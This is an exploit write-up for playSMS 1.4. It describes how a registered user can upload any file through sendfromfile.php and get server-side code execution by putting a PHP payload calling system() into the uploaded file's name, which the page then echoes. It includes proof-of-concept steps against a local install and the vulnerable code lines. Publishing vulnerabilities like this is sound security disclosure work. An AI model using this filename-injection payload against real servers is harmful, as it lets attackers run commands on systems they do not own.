# Date: 14-05-2017
# Software Link: https://playsms.org/download/
# Version: 1.4
# Exploit Author: Touhid M.Shaikh
# Contact: http://twitter.com/touhidshaikh22
# Website: http://touhidshaikh.com/
# Category: webapps
  
1. Description
    
Unrestricted File Upload: 
    Any registered user can upload any file because of not proper Validation of file in sendfromfile.php
 
Code Execution using $filename 
    Now We know sendfromfile.php accept any file extension and just read content not stored in server. But there is bug when user upload example: mybackdoor.php server accept happily  but not store in any folder so our shell is useless. But if User change the file name to "mybackdoor.php" to "<?php system(&#039;uname -a&#039;); dia();?>.php"  den server check for file and set some perameter $filename="<?php system(&#039;uname -a&#039;); dia();?>.php" , U can see code below and display $filename on page.
 
 For More Details : www.touhidshaikh.com/blog/
    
2. Proof of Concept
  
Login as regular user (created using index.php?app=main&inc=core_auth&route=register):
 
Go to : http://127.0.0.1/playsms/index.php?app=main&inc=feature_sendfromfile&op=list
  
 
 This is Form.
----------------------------Form for upload CSV file ----------------------
<form action=\"index.php?app=main&inc=feature_sendfromfile&op=upload_confirm\" enctype=\"multipart/form-data\" method=\"post\">
" . _CSRF_FORM_ . "
<p>" . _(&#039;Please select CSV file&#039;) . "</p>
<p><input type=\"file\" name=\"fncsv\"></p>
<p class=help-block>" . _(&#039;CSV file format&#039;) . " : " . $info_format . "</p>
<p><input type=checkbox name=fncsv_dup value=1 checked> " . _(&#039;Prevent duplicates&#039;) . "</p>
<p><input type=\"submit\" value=\"" . _(&#039;Upload file&#039;) . "\" class=\"button\"></p>
</form>
------------------------------Form ends ---------------------------
 
 
-------------PHP code for set parameter ---------------------------
 
    case &#039;upload_confirm&#039;:
        $filename = $_FILES[&#039;fncsv&#039;][&#039;name&#039;];
 
------------------------------php code ends ---------------------------
 
 
$filename will be visible on page:
----------------------Vulnerable perameter show ----------------------
 
line 123 : $content .= _(&#039;Uploaded file&#039;) . &#039;: &#039; . $filename . &#039;<p />&#039;;
 
----------------------------------------------------------------------

